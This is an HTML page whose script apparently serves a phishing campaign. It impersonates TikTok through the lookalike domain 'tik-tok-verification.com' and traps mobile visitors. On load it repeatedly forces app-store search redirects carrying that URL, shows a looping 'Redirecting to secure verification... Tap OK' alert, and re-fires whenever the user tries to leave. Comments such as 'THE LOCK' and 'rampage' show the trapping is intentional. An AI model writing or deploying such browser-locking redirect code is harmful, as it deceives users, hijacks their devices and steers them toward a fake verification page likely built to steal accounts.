<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 5000; 

    function triggerStoreJump() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const urlEnc = encodeURIComponent(target);

        // This is what you confirmed works: The Store Search Handover
        if (isAndroid) {
            window.location.href = "market://search?q=" + urlEnc;
        } else {
            // iOS: The exact string that triggered for you at the end of the fail-safe
            window.location.href = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        }
    }

    function rampage() {
        if (Date.now() > killTime) return; // ATOMIC FAIL-SAFE

        // 1. Fire the jump that we KNOW works
        triggerStoreJump();

        // 2. THE LOCK
        alert("ATTEMPT #26\n\nRedirecting to secure verification...\n\nTap OK to continue.");

        // 3. THE GAP: 
        // We wait 300ms. This is the "Clear Path" for the App Store to launch 
        // while the main thread is NOT blocked by an alert.
        setTimeout(() => {
            if (Date.now() < killTime) {
                rampage();
            }
        }, 300); 
    }

    window.onload = () => {
        rampage();
    };

    // If they try to swipe or leave during the 300ms gap, re-lock instantly
    window.onblur = () => { if (Date.now() < killTime) rampage(); };
</script>
